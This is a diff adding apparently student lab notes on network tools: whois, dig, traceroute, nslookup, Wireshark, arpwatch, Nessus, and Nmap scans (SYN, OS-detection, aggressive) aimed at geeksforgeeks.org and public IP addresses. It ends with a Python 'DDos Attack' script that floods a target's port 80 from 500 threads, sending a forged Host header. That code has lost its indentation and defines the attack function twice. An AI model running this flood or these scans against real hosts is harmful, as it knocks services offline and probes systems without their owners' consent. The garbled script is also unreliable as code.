@@ -1,0 +1,88 @@
+Exp 6: -Network Commands
+Commands: (Run on Fedora or Ubuntu)
+1. Whois: whois javatpoint.com
+2. Dig: dig geeksforgeeks.org or dig geeksforgeeks.org +short
+3. Traceroute: traceroute google.com
+4. Nslookup: nslookup google.com or nslookup 142.250.192.14
+
+Exp 7: -WireShark
+Steps: 1. Open WireShark
+2. Connect to any Local Area Connection
+3. Type dns or tcp or http for filtering packets
+4. After selecting a packet right click on that and open “Follow
+TCPStream”.
+
+Exp 8: -Nmap
+Install Nmap on Windows or Linux(sudo apt-get install nmap)
+Commands:
+1. nmap –version
+2. nmap www.geeksforgeeks.org
+3. nmap 172.217.27.174
+4. nmap -v www.geeksforgeeks.org
+5. nmap 103.76.228.244 172.217.27.174
+6. nmap 103.76.228.*
+7. nmap -sA 103.76.228.244
+8. nmap -iL input.txt (First create input.txt file and add some ip addresses
+in it)
+9. nmap -sS www.geeksforgeeks.org
+10.nmap -sS www.geeksforgeeks.org -oG map_result
+11.nmap -sn www.geeksforgeeks.org
+12.nmap -p 88 443 21 www.geeksforgeeks.org
+13.nmap -p 1-80 www.geeksforgeeks.org
+14.nmap -A www.geeksforgeeks.org
+
+15.nmap --trace out www.geeksforgeeks.org
+16.nmap -O www.geeksforgeeks.org
+
+Exp 9: -ArpWatch
+1. Installation on Fedora: 2. sudo yum install arpwatch
+3. systemctl enable arpwatch
+4. systemctl start arpwatch
+5. systemctl status arpwatch
+6. sudo arpwatch -i (device name)
+7. sudo journalctl -f
+8. arp -a
+
+Exp 10: -Nessus
+Install on Windows or Linux
+After Installation Steps:
+1. My Scan->New Scan->Basic Network Scan
+2. In target provide an IP or website name
+3. Save it and Scan
+4. Check for Hosts and Vulnerabilities
+
+Exp 11: -DDos Attack
+Code:
+import socket
+import threading
+target = &#39;10.0.0.138&#39;
+fake_ip = &#39;182.21.20.32&#39;
+port = 80
+def attack():
+while True:
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+s.sendto((&quot;GET /&quot; + target + &quot;
+HTTP/1.1\r\n&quot;).encode(&#39;ascii&#39;), (target, port))
+s.sendto((&quot;Host: &quot; + fake_ip + &quot;\r\n\r\n&quot;).encode(&#39;ascii&#39;),
+(target, port))
+s.close()
+for i in range(500):
+thread = threading.Thread(target=attack)
+thread.start()
+attack_num = 0
+def attack():
+while True:
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+s.sendto((&quot;GET /&quot; + target + &quot;
+HTTP/1.1\r\n&quot;).encode(&#39;ascii&#39;), (target, port))
+s.sendto((&quot;Host: &quot; + fake_ip + &quot;\r\n\r\n&quot;).encode(&#39;ascii&#39;),
+(target, port))
+global attack_num
+attack_num += 1
+print(attack_num)
+s.close()
+
+
